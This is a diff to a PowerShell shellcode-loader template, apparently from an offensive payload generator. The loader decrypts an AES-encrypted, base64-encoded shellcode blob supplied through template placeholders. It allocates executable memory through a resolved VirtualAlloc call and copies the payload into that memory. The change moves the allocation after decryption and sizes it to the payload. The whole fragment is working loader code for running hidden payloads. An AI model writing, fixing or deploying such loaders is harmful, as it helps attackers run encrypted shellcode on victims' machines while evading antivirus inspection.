@@ -103,8 +103,7 @@ else
     Write-Host "32-bit OS"
 }
 
-$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
-  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
 
 
 $key = [System.Text.Encoding]::ASCII.GetBytes("{{aes_key}}")
@@ -115,6 +114,9 @@ $iv = [System.Convert]::ToBase64String($iv)
 $b64 = "{{b64_aes_shellcode}}"
 $y = [System.Convert]::FromBase64String($b64)
 $buf = Decrypt-Bytes $key $iv $y
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
+  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, $buf.length, 0x3000, 0x40)
 
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
 
